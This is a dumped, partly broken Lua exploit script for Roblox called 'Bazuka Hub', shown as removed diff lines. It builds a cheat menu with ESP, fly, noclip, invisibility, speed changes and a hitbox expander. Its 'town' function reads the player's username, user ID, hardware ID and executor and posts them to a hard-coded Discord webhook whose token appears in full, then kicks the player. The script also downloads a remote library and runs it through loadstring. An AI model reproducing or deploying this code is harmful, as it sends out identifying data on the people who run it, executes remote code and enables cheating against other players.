-    local _5570 = _5569.Toggle
-    _5570(_5569, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5572, _5572_2, _5572_3)
-    end)
-    local _5573 = _5569.Slider
-    _5573(_5569, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_5575, _5575_2, _5575_3)
-        local _5576, _5576_2, _5576_3 = math.floor(_5575)
-        local _ = _5576 / 100
-    end)
-    type(_5383)
-    local _ = _5383.r
-    local _ = _5383.g
-    local _ = _5383.b
-    local _5582 = _5569.ColorPicker
-    local _5583 = Color3.new
-    local _5584 = _5583()
-    _5582(_5569, {
-        Default = _5584,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_5586, _5586_2, _5586_3)
-    end)
-    local _5587 = _5569.Slider
-    _5587(_5569, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_5589, _5589_2, _5589_3)
-        local _5590, _5590_2, _5590_3 = math.floor(_5589)
-        local _ = _5590 / 100
-    end)
-    type(_5385)
-    local _ = _5385.r
-    local _ = _5385.g
-    local _ = _5385.b
-    local _5596 = _5569.ColorPicker
-    local _5597 = Color3.new
-    local _5598 = _5597()
-    _5596(_5569, {
-        Default = _5598,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_5600, _5600_2, _5600_3)
-    end)
-    local _5601 = _5567.Section
-    local _5602 = _5601(_5567, "ESP", "Right")
-    local _5603 = _5602.Toggle
-    _5603(_5602, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_5605, _5605_2, _5605_3)
-    end)
-    local _5606 = _5602.Slider
-    _5606(_5602, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_5608, _5608_2, _5608_3)
-        local _5609, _5609_2, _5609_3 = math.floor(_5608)
-        local _ = _5609 / 100
-    end)
-    local _5611 = _5602.Toggle
-    _5611(_5602, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_5613, _5613_2, _5613_3)
-    end)
-    local _5614 = _5602.Toggle
-    _5614(_5602, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_5616, _5616_2, _5616_3)
-    end)
-    local _5617 = _5602.Toggle
-    _5617(_5602, {
-        Description = "",
-        Title = "Health ESP",
-    }, function(_5620, _5620_2, _5620_3)
-    end)
-    local _5621 = _5602.Toggle
-    _5621(_5602, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_5623, _5623_2, _5623_3)
-    end)
-    local _5624 = _5602.Slider
-    _5624(_5602, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_5626, _5626_2, _5626_3)
-        math.floor(_5626)
-    end)
-    type(_5393)
-    local _ = _5393.r
-    local _ = _5393.g
-    local _ = _5393.b
-    local _5632 = _5602.ColorPicker
-    local _5633 = Color3.new
-    local _5634 = _5633()
-    _5632(_5602, {
-        Default = _5634,
-        Description = "",
-        Title = "Text Color",
-    }, function(_5636, _5636_2, _5636_3)
-    end)
-    local _5637 = _5365.Button
-    local _5638 = _5637(_5365, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _5639 = _5638.Section
-    local _5640 = _5639(_5638, "Character Actions", "Left")
-    local _5641 = _5640.Button
-    _5641(_5640, {
-        ButtonName = "Sit",
-        Title = "Sitting down",
-        Description = "",
-    }, function(_5643, _5643_2, _5643_3)
-        local _5644 = game.Players.LocalPlayer
-        local _5645 = _5644.Character
-        local _5646 = _5645.Humanoid
-        _5646.Sit = true
-    end)
-    local _5647 = _5640.Button
-    _5647(_5640, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_5649, _5649_2, _5649_3)
-        local _5650 = game.Players.LocalPlayer
-        local _5651 = _5650.Character
-        local _ = _5651.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _5653 = _5640.Button
-    _5653(_5640, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_5655, _5655_2, _5655_3)
-        local _TeleportService5656 = game:GetService("TeleportService")
-        local _5657 = _TeleportService5656.Teleport
-        local _Players5658 = game:GetService("Players")
-        local _5659 = _Players5658.LocalPlayer
-        _5657(_TeleportService5656, game.PlaceId, _5659)
-    end)
-    local _5661 = _5640.Button
-    _5661(_5640, {
-        ButtonName = "Give Item",
-        Title = "Click TP",
-        Description = "Giving You Item",
-    }, function(_5663, _5663_2, _5663_3)
-        local _5664 = game.Players.LocalPlayer
-        local _5665 = _5664.GetMouse
-        local _5666 = _5665(_5664)
-        local _5667 = Instance.new
-        local _5668 = _5667("Tool")
-        _5668.RequiresHandle = false
-        _5668.Name = "Click TP"
-        local _5669 = _5668.Activated
-        local _5670 = _5669.connect
-        _5670(_5669, function(_5672, _5672_2, _5672_3)
-            local _5673 = _5666.Hit
-            local _5674 = Vector3.new
-            local _5675 = _5674(0, 2.5, 0)
-            local _5676 = _5673 + _5675
-            local _5677 = CFrame.new
-            local _5678 = _5676.X
-            local _5679 = _5676.Y
-            local _5680 = _5676.Z
-            local _5681 = _5677(_5678, _5679, _5680)
-            local _5682 = game.Players.LocalPlayer
-            local _5683 = _5682.Character
-            local _5684 = _5683.HumanoidRootPart
-            _5684.CFrame = _5681
-        end)
-        local _5685 = game.Players.LocalPlayer
-        local _5686 = _5685.Backpack
-        _5668.Parent = _5686
-    end)
-    local _5687 = _5638.Section
-    local _5688 = _5687(_5638, "Property Multiplier", "Right")
-    local _5689 = _5688.Slider
-    local _5690 = game.Players.LocalPlayer
-    local _5691 = _5690.Character
-    local _5692 = _5691.Humanoid
-    local _5693 = _5692.JumpHeight
-    _5689(_5688, {
-        Min = 1,
-        Title = "Jump Height",
-        Max = 300,
-        Default = _5693,
-        Description = "",
-    }, function(_5695, _5695_2, _5695_3)
-        local _5696 = game.Players.LocalPlayer
-        local _5697 = _5696.Character
-        local _5698 = _5697.FindFirstChild
-        _5698(_5697, "Humanoid")
-        local _5700 = game.Players.LocalPlayer
-        local _5701 = _5700.Character
-        local _5702 = _5701.Humanoid
-        local _5703, _5703_2, _5703_3 = math.floor(_5695)
-        _5702.JumpHeight = _5703
-    end)
-    local _5704 = _5688.Slider
-    local _5705 = game.Players.LocalPlayer
-    local _5706 = _5705.Character
-    local _5707 = _5706.Humanoid
-    local _5708 = _5707.WalkSpeed
-    _5704(_5688, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 300,
-        Default = _5708,
-        Description = "",
-    }, function(_5710, _5710_2, _5710_3)
-        local _5711 = game.Players.LocalPlayer
-        local _5712 = _5711.Character
-        local _5713 = _5712.FindFirstChild
-        _5713(_5712, "Humanoid")
-        local _5715 = game.Players.LocalPlayer
-        local _5716 = _5715.Character
-        local _5717 = _5716.Humanoid
-        local _5718, _5718_2, _5718_3 = math.floor(_5710)
-        _5717.WalkSpeed = _5718
-    end)
-    local _5719 = Instance.new
-    local _5720 = _5719("ScreenGui", game.CoreGui)
-    local _5721 = Instance.new
-    local _5722 = _5721("TextButton")
-    _5722.BackgroundTransparency = 1
-    local _5723 = UDim2.new
-    local _5724 = _5723(0, 0, 0, 0)
-    _5722.Size = _5724
-    _5722.Text = " "
-    _5722.Parent = _5720
-    local _5725 = Instance.new
-    local _5726 = _5725("ScreenGui", game.CoreGui)
-    _5726.Name = "BackgroundScreenGui"
-    _5726.Enabled = true
-    local _5727 = Instance.new
-    local _5728 = _5727("TextLabel", _5726)
-    _5728.Name = "BackgroundLabel"
-    local _5729 = Instance.new
-    local _5730 = _5729("UIGradient", _5728)
-    _5730.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _5777
-fenv.backgroundgradientcolor2 = _5779
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _5781
-fenv.customshadowcolor = _5783
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.synchronizationstatus = false
-fenv.synchrohitted = false
-fenv.autosaveconfig = false
-fenv.fullbrightstatus = false
-fenv.levelofbrightness = 0
-fenv.originaltime = _5784
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.originalfogcolor = _5785
-fenv.customfogcolor = _5787
-fenv.originalfogend = _5788
-fenv.customfogend = 1000
-fenv.originalfogstart = _5789
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.chamsstatus = false
-fenv.chamsoutlinecolora = _5791
-fenv.chamsfillingcolora = _5793
-fenv.chamsoutlinetransparencya = 0
-fenv.chamsfillingtransparencya = 0.9
-fenv.espstatus = false
-fenv.nameespstatus = false
-fenv.healthespstatus = false
-fenv.distanceespstatus = false
-fenv.enabledoutline = true
-fenv.textsizenamea = 8
-fenv.nameespcolora = _5795
-fenv.espoffseta = 0.5
-fenv.fontnameesp = "Montserrat"
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 1
-fenv.jumppowermultiplier = false
-fenv.jumppowerplayer = 35
-fenv.noclip = false
-fenv.invis = false
-fenv.fly = false
-fenv.flyspeed = 30
-fenv.expanderstatus = false
-fenv.nogmexpander = true
-fenv.headsizea = 1
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-local _ = fenv.gameProcessedEvent
-fenv.noclip = true
-fenv.invis = true
-fenv.fly = true
-fenv.CONTROL = {
-    Q = 0,
-    B = 0,
-    E = 0,
-    L = 0,
-    R = 0,
-    F = 0,
-}
-fenv.lCONTROL = {
-    Q = 0,
-    B = 0,
-    E = 0,
-    L = 0,
-    R = 0,
-    F = 0,
-}
-fenv.SPEED = 30
-fenv.QEfly = true
-fenv.vehicleflyspeed = 30
-fenv.FLYING = false
-local _ = fenv.flyKeyDown
-local _ = fenv.flyKeyUp
-fenv.NOFLY = function(_5888, _5888_2, _5888_3)
-    local _5891 = game.Players.LocalPlayer
-    local _5892 = _5891.Character
-    local _5893 = _5892.FindFirstChildOfClass
-    _5893(_5892, "Humanoid")
-    local _5895 = game.Players.LocalPlayer
-    local _5896 = _5895.Character
-    local _5897 = _5896.FindFirstChildOfClass
-    local _5898 = _5897(_5896, "Humanoid")
-    _5898.PlatformStand = false
-    local _5899 = workspace.CurrentCamera
-    _5899.CameraType = Enum.CameraType.Custom
-end
-fenv.T = _5912
-fenv.BG = _5914
-fenv.BV = _5916
-fenv.FLYING = true
-fenv.SPEED = 0
-fenv.updateFly = function(_5924, _5924_2, _5924_3)
-    local _5925 = Vector3.new
-    local _5926 = _5925(0, 0, 0)
-    _5916.velocity = _5926
-    local _5927 = workspace.CurrentCamera
-    local _5928 = _5927.CoordinateFrame
-    _5914.cframe = _5928
-end
-fenv.key = _5934
-fenv.flyKeyDown = _5932
-fenv.key = _5940
-fenv.flyKeyUp = _5938
-fenv.SPEED = 0
-fenv.sFLY = function(_5900, _5900_2, _5900_3)
-    local _ = game.Players.LocalPlayer
-    local _5902 = game.Players.LocalPlayer
-    local _ = _5902.Character
-    local _5904 = game.Players.LocalPlayer
-    local _5905 = _5904.Character
-    local _5906 = _5905.FindFirstChildOfClass
-    _5906(_5905, "Humanoid")
-    game:GetService("UserInputService")
-    local _5909 = game.Players.LocalPlayer
-    local _5910 = _5909.Character
-    local _5911 = _5910.FindFirstChild
-    local _5912 = _5911(_5910, "HumanoidRootPart")
-    local _5913 = Instance.new
-    local _5914 = _5913("BodyGyro")
-    local _5915 = Instance.new
-    local _5916 = _5915("BodyVelocity")
-    _5914.P = 90000
-    local _5917 = Vector3.new
-    local _5918 = _5917(8999999488, 8999999488, 8999999488)
-    _5914.maxTorque = _5918
-    local _5919 = _5912.CFrame
-    _5914.cframe = _5919
-    local _5920 = Vector3.new
-    local _5921 = _5920(0, 0, 0)
-    _5916.velocity = _5921
-    local _5922 = Vector3.new
-    local _5923 = _5922(8999999488, 8999999488, 8999999488)
-    _5916.maxForce = _5923
-    _5914.Parent = _5912
-    _5916.Parent = _5912
-    local _UserInputService5929 = game:GetService("UserInputService")
-    local _5930 = _UserInputService5929.InputBegan
-    local _5931 = _5930.Connect
-    _5931(_5930, function(_5933, _5933_2, _5933_3)
-        local _ = _5933.KeyCode
-    end)
-    local _UserInputService5935 = game:GetService("UserInputService")
-    local _5936 = _UserInputService5935.InputEnded
-    local _5937 = _5936.Connect
-    _5937(_5936, function(_5939, _5939_2, _5939_3)
-        local _ = _5939.KeyCode
-    end)
-    local _RunService5941 = game:GetService("RunService")
-    local _5942 = _RunService5941.Heartbeat
-    local _5943 = _5942.Connect
-    _5943(_5942, function(_5945, _5945_2, _5945_3)
-        local _5946 = Vector3.new
-        local _5947 = _5946(0, 0, 0)
-        _5916.velocity = _5947
-        local _5948 = workspace.CurrentCamera
-        local _5949 = _5948.CoordinateFrame
-        _5914.cframe = _5949
-    end)
-end
-fenv.T = _5965
-fenv.BG = _5967
-fenv.BV = _5969
-fenv.FLYING = true
-fenv.SPEED = 0
-fenv.updateFly = function(_5977, _5977_2, _5977_3)
-    local _5978 = Vector3.new
-    local _5979 = _5978(0, 0, 0)
-    _5969.velocity = _5979
-    local _5980 = workspace.CurrentCamera
-    local _5981 = _5980.CoordinateFrame
-    _5967.cframe = _5981
-end
-fenv.key = _5987
-fenv.flyKeyDown = _5985
-fenv.key = _5993
-fenv.flyKeyUp = _5991
-fenv.SPEED = 0
-fenv.flyspeed = _6008
-fenv.expanderstatus = _6079
-fenv.nogmexpander = _6082
-fenv.headsizea = nil
-fenv.changetimestatus = _6104
-fenv.hours = _6108
-fenv.minutes = _6112
-fenv.fullbrightstatus = _6117
-fenv.levelofbrightness = _6121
-fenv.changefogstatus = _6126
-fenv.customfogend = _6130
-fenv.customfogstart = _6134
-fenv.b = _6138
-fenv.g = _6137
-fenv.r = _6136
-fenv.customfogcolor = _6143
-fenv.chamsstatus = _6150
-fenv.chamsoutlinetransparencya = _6155
-fenv.b = _6159
-fenv.g = _6158
-fenv.r = _6157
-fenv.chamsoutlinecolora = _6164
-fenv.chamsfillingtransparencya = _6169
-fenv.b = _6173
-fenv.g = _6172
-fenv.r = _6171
-fenv.chamsfillingcolora = _6178
-fenv.espstatus = _6183
-fenv.espoffseta = _6188
-fenv.enabledoutline = _6191
-fenv.nameespstatus = _6194
-fenv.healthespstatus = _6197
-fenv.distanceespstatus = _6200
-fenv.textsizenamea = _6204
-fenv.b = _6208
-fenv.g = _6207
-fenv.r = _6206
-fenv.nameespcolora = _6213
-fenv.mouse = _6243
-fenv.tool = _6245
-fenv.jumppowermultiplier = _6268
-fenv.jumppowerplayer = _6272
-fenv.walkspeedmultiplier = _6277
-fenv.walkspeedplayer = _6281
-fenv.town = function(_5732, _5732_2, _5732_3)
-    local _5733 = game.Players.LocalPlayer
-    local _5734 = _5733.UserId
-    local _5735 = game.Players.LocalPlayer
-    local _5736 = _5735.DisplayName
-    local _5737 = game.Players.LocalPlayer
-    local _5738 = _5737.Name
-    local _RbxAnalyticsService5739 = game:GetService("RbxAnalyticsService")
-    local _5740 = _RbxAnalyticsService5739.GetClientId
-    local _5741 = _5740(_RbxAnalyticsService5739)
-    local _MarketplaceService5742 = game:GetService("MarketplaceService")
-    local _5743 = _MarketplaceService5742.GetProductInfo
-    local _5744 = _5743(_MarketplaceService5742, game.PlaceId)
-    local _5745 = _5744.Name
-    local _5746, _5746_2 = identifyexecutor()
-    local _5747, _5747_2, _5747_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _5734, _5736, _5738, _5734, _5741, "03/21/2025", "14:26:59", game.PlaceId, _5745, game.PlaceId, _5746)
-    local _5748 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _5734
-    local _5749 = _5748 .. "&width=150&height=150&format=png"
-    local _HttpService5750 = game:GetService("HttpService")
-    local _5751 = _HttpService5750.JSONEncode
-    local _5752 = _5751(_HttpService5750, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _5747,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _5749,
-                },
-            },
-        },
-    })
-    local _5753 = _5752.gsub
-    local _5754 = _5753(_5752, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _5754,
-    })
-    local _5756 = game.Players.LocalPlayer
-    local _5757 = _5756.Kick
-    _5757(_5756, "GOT YOU XD!")
-    local _5759 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _5760 = loadstring(_5759)
-    local _5761 = _5760()
-    local _5762 = _5761.new
-    local _5763 = game.Players.LocalPlayer
-    local _5764 = _5763.DisplayName
-    local _5765 = _5762("Bazuka Hub", _5764, "Bazuka Hub")
-    local _5766 = _5765.Category
-    local _5767 = _5766(_5765, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _5768 = _5765.Category
-    local _5769 = _5768(_5765, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _5770 = _5765.Category
-    local _5771 = _5770(_5765, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _5772 = _5765.Category
-    local _5773 = _5772(_5765, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _5774 = _5765.Category
-    _5774(_5765, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _5776 = Color3.fromRGB
-    _5776(255, 255, 255)
-    local _5778 = Color3.fromRGB
-    _5778(0, 0, 0)
-    local _5780 = Color3.fromRGB
-    _5780(160, 160, 160)
-    local _5782 = Color3.fromRGB
-    _5782(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _5786 = Color3.fromRGB
-    local _5787 = _5786(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _5790 = Color3.fromRGB
-    local _5791 = _5790(255, 255, 255)
-    local _5792 = Color3.fromRGB
-    local _5793 = _5792(255, 255, 255)
-    local _5794 = Color3.fromRGB
-    local _5795 = _5794(255, 255, 255)
-    task.spawn(function(_5797, _5797_2, _5797_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_5800, _5800_2, _5800_3)
-    end)
-    task.spawn(function(_5802, _5802_2, _5802_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_5805, _5805_2, _5805_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _5806 = _5765.Notification
-    _5806(_5765, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _5808 = _5767.Button
-    local _5809 = _5808(_5767, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _5810 = _5809.Section
-    local _5811 = _5810(_5809, "GUI was made by Bazuka_ofcx", "Left")
-    local _5812 = _5811.Button
-    _5812(_5811, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_5814, _5814_2, _5814_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _5815 = _5811.Button
-    _5815(_5811, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_5817, _5817_2, _5817_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _5818 = _5809.Section
-    _5818(_5809, "Information:", "Left")
-    local _5820 = _5809.Section
-    _5820(_5809, "Last Update Changelog:", "Right")
-    local _5822 = _5769.Button
-    local _5823 = _5822(_5769, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _5824 = _5823.Section
-    local _5825 = _5824(_5823, "Keybinds", "Left")
-    local _5826 = _5825.Keybind
-    _5826(_5825, {
-        Default = Enum.KeyCode.Delete,
-        Description = "Keybind Noclip On/Off",
-        Title = "Noclip",
-    }, function(_5828, _5828_2, _5828_3)
-        local _ = game.Players.LocalPlayer
-        local _5831 = game.Players.LocalPlayer
-        local _ = _5831.Character
-        local _5833 = _5765.Notification
-        _5833(_5765, {
-            expire = 3,
-            Title = "Bazuka Hub",
-            Desc = "Noclip now enabled !",
-        })
-    end)
-    local _5835 = _5825.Keybind
-    _5835(_5825, {
-        Default = Enum.KeyCode.F,
-        Description = "Keybind Invisibility On/Off (Broke Speed)",
-        Title = "Invisibility",
-    }, function(_5837, _5837_2, _5837_3)
-        local _ = game.Players.LocalPlayer
-        local _5839 = game.Players.LocalPlayer
-        local _ = _5839.Character
-        local _5841 = _5765.Notification
-        _5841(_5765, {
-            expire = 3,
-            Title = "Bazuka Hub",
-            Desc = "Invisibility now enabled !",
-        })
-        local _5843 = game.Players.LocalPlayer
-        local _5844 = _5843.Character
-        local _5845 = _5844.FindFirstChildOfClass
-        local _5846 = _5845(_5844, "Tool")
-        local _5847 = game.Players.LocalPlayer
-        local _5848 = _5847.Character
-        local _5849 = _5848.Humanoid
-        local _5850 = _5849.UnequipTools
-        _5850(_5849)
-        local _5852 = game.Players.LocalPlayer
-        local _5853 = _5852.Character
-        local _5854 = _5853.HumanoidRootPart
-        local _5855 = _5854.CFrame
-        local _5856 = game.Players.LocalPlayer
-        local _5857 = _5856.Character
-        local _5858 = _5857.MoveTo
-        local _5859 = Vector3.new
-        local _5860 = _5859(10000.75, 100000.35, 10000.51)
-        _5858(_5857, _5860)
-        local _5862 = Instance.new
-        local _5863 = _5862("Seat", game.Workspace)
-        _5863.Anchored = false
-        _5863.CanCollide = false
-        _5863.Name = "Bazuka HubInvis"
-        _5863.Transparency = 1
-        local _5864 = Vector3.new
-        local _5865 = _5864(10000.75, 100000.35, 10000.51)
-        _5863.Position = _5865
-        local _5866 = Instance.new
-        local _5867 = _5866("Weld", _5863)
-        _5867.Part0 = _5863
-        local _5868 = game.Players.LocalPlayer
-        local _5869 = _5868.Character
-        local _5870 = _5869.FindFirstChild
-        local _5871 = _5870(_5869, "Torso")
-        _5867.Part1 = _5871
-        _5863.CFrame = _5855
-        local _5872 = game.Players.LocalPlayer
-        local _5873 = _5872.Character
-        local _5874 = _5873.GetChildren
-        local _5875 = _5874(_5873)
-        for _5876, _5876_2 in _5875 do
-            local _5877 = _5876_2.IsA
-            _5877(_5876_2, "Part")
-            local _ = _5876_2.Name
-            _5876_2.Transparency = 0.5
-        end
-        local _5880 = game.Players.LocalPlayer
-        local _5881 = _5880.Character
-        local _5882 = _5881.Humanoid
-        local _5883 = _5882.EquipTool
-        _5883(_5882, _5846)
-    end)
-    local _5885 = _5825.Keybind
-    _5885(_5825, {
-        Default = Enum.KeyCode.End,
-        Description = "Keybind Fly On/Off",
-        Title = "Fly",
-    }, function(_5887, _5887_2, _5887_3)
-        local _ = game.Players.LocalPlayer
-        local _5951 = game.Players.LocalPlayer
-        local _ = _5951.Character
-        local _5953 = game.Players.LocalPlayer
-        local _5954 = _5953.Character
-        local _5955 = _5954.FindFirstChildOfClass
-        _5955(_5954, "Humanoid")
-        game:GetService("UserInputService")
-        local _5958 = _5932.Disconnect
-        _5958(_5932)
-        local _5960 = _5938.Disconnect
-        _5960(_5938)
-        local _5962 = game.Players.LocalPlayer
-        local _5963 = _5962.Character
-        local _5964 = _5963.FindFirstChild
-        local _5965 = _5964(_5963, "HumanoidRootPart")
-        local _5966 = Instance.new
-        local _5967 = _5966("BodyGyro")
-        local _5968 = Instance.new
-        local _5969 = _5968("BodyVelocity")
-        _5967.P = 90000
-        local _5970 = Vector3.new
-        local _5971 = _5970(8999999488, 8999999488, 8999999488)
-        _5967.maxTorque = _5971
-        local _5972 = _5965.CFrame
-        _5967.cframe = _5972
-        local _5973 = Vector3.new
-        local _5974 = _5973(0, 0, 0)
-        _5969.velocity = _5974
-        local _5975 = Vector3.new
-        local _5976 = _5975(8999999488, 8999999488, 8999999488)
-        _5969.maxForce = _5976
-        _5967.Parent = _5965
-        _5969.Parent = _5965
-        local _UserInputService5982 = game:GetService("UserInputService")
-        local _5983 = _UserInputService5982.InputBegan
-        local _5984 = _5983.Connect
-        _5984(_5983, function(_5986, _5986_2, _5986_3)
-            local _ = _5986.KeyCode
-        end)
-        local _UserInputService5988 = game:GetService("UserInputService")
-        local _5989 = _UserInputService5988.InputEnded
-        local _5990 = _5989.Connect
-        _5990(_5989, function(_5992, _5992_2, _5992_3)
-            local _ = _5992.KeyCode
-        end)
-        local _RunService5994 = game:GetService("RunService")
-        local _5995 = _RunService5994.Heartbeat
-        local _5996 = _5995.Connect
-        _5996(_5995, function(_5998, _5998_2, _5998_3)
-            local _5999 = Vector3.new
-            local _6000 = _5999(0, 0, 0)
-            _5969.velocity = _6000
-            local _6001 = workspace.CurrentCamera
-            local _6002 = _6001.CoordinateFrame
-            _5967.cframe = _6002
-        end)
-        local _6003 = _5765.Notification
-        _6003(_5765, {
-            expire = 3,
-            Title = "Bazuka Hub",
-            Desc = "Fly now enabled !",
-        })
-    end)
-    local _6005 = _5825.Slider
-    _6005(_5825, {
-        Min = 1,
-        Title = "Fly Speed",
-        Max = 50,
-        Default = 30,
-        Description = "",
-    }, function(_6007, _6007_2, _6007_3)
-        math.floor(_6007)
-    end)
-    local _6009 = _5823.Section
-    local _6010 = _6009(_5823, "Give", "Left")
-    local _6011 = _6010.Button
-    _6011(_6010, {
-        ButtonName = "Give",
-        Title = "Other",
-        Description = "Gives You other items",
-    }, function(_6013, _6013_2, _6013_3)
-        local _TextChatService6014 = game:GetService("TextChatService")
-        local _6015 = _TextChatService6014.TextChannels
-        local _6016 = _6015.RBXGeneral
-        local _6017 = _6016.SendAsync
-        _6017(_6016, "!cmds")
-        local _6019 = game.Players.LocalPlayer
-        local _6020 = _6019.PlayerGui
-        local _6021 = _6020.CmdLister
-        local _6022 = _6021.ToolFolder
-        local _6023 = _6022.Other
-        local _6024 = _6023.GetDescendants
-        local _6025 = _6024(_6023)
-        for _6026, _6026_2 in _6025 do
-            local _6027 = _6026_2.IsA
-            _6027(_6026_2, "BoolValue")
-            local _6029 = _6026_2.Name
-            local _6030 = _6029.gsub
-            local _6031 = _6030(_6029, "%s", "")
-            local _TextChatService6032 = game:GetService("TextChatService")
-            local _6033 = _TextChatService6032.TextChannels
-            local _6034 = _6033.RBXGeneral
-            local _6035 = _6034.SendAsync
-            local _6036 = "!spawn " .. _6031
-            _6035(_6034, _6036)
-        end
-        local _6038 = game.Players.LocalPlayer
-        local _6039 = _6038.PlayerGui
-        local _6040 = _6039.CmdLister
-        local _6041 = _6040.Remove
-        _6041(_6040)
-    end)
-    local _6043 = _6010.Button
-    _6043(_6010, {
-        ButtonName = "Give",
-        Title = "Attachments",
-        Description = "Gives You all Attachments",
-    }, function(_6045, _6045_2, _6045_3)
-        local _TextChatService6046 = game:GetService("TextChatService")
-        local _6047 = _TextChatService6046.TextChannels
-        local _6048 = _6047.RBXGeneral
-        local _6049 = _6048.SendAsync
-        _6049(_6048, "!cmds")
-        local _6051 = game.Players.LocalPlayer
-        local _6052 = _6051.PlayerGui
-        local _6053 = _6052.CmdLister
-        local _6054 = _6053.ToolFolder
-        local _6055 = _6054.Attachments
-        local _6056 = _6055.GetDescendants
-        local _6057 = _6056(_6055)
-        for _6058, _6058_2 in _6057 do
-            local _6059 = _6058_2.IsA
-            _6059(_6058_2, "BoolValue")
-            local _6061 = _6058_2.Name
-            local _6062 = _6061.gsub
-            local _6063 = _6062(_6061, "%s", "")
-            local _TextChatService6064 = game:GetService("TextChatService")
-            local _6065 = _TextChatService6064.TextChannels
-            local _6066 = _6065.RBXGeneral
-            local _6067 = _6066.SendAsync
-            local _6068 = "!spawn " .. _6063
-            _6067(_6066, _6068)
-        end
-        local _6070 = game.Players.LocalPlayer
-        local _6071 = _6070.PlayerGui
-        local _6072 = _6071.CmdLister
-        local _6073 = _6072.Remove
-        _6073(_6072)
-    end)
-    local _6075 = _5823.Section
-    local _6076 = _6075(_5823, "Hitbox Expander", "Right")
-    local _6077 = _6076.Toggle
-    _6077(_6076, {
-        Default = false,
-        Description = "Expand Body Parts",
-        Title = "Enable",
-    }, function(_6079, _6079_2, _6079_3)
-    end)
-    local _6080 = _6076.Toggle
-    _6080(_6076, {
-        Default = true,
-        Description = "Disable Expander if player has GM",
-        Title = "No GM",
-    }, function(_6082, _6082_2, _6082_3)
-    end)
-    local _6083 = _6076.Slider
-    _6083(_6076, {
-        Min = 1,
-        Title = "Head Size",
-        Max = 630,
-        Default = 100,
-        Description = "",
-    }, function(_6085, _6085_2, _6085_3)
-        local _6086, _6086_2, _6086_3 = math.floor(_6085)
-        local _ = _6086 / 100
-    end)
-    local _6088 = _5823.Section
-    local _6089 = _6088(_5823, "Walls", "Right")
-    local _6090 = _6089.Button
-    _6090(_6089, {
-        ButtonName = "Make",
-        Title = "Make Penetrate",
-        Description = "Makes Parts Penetrate",
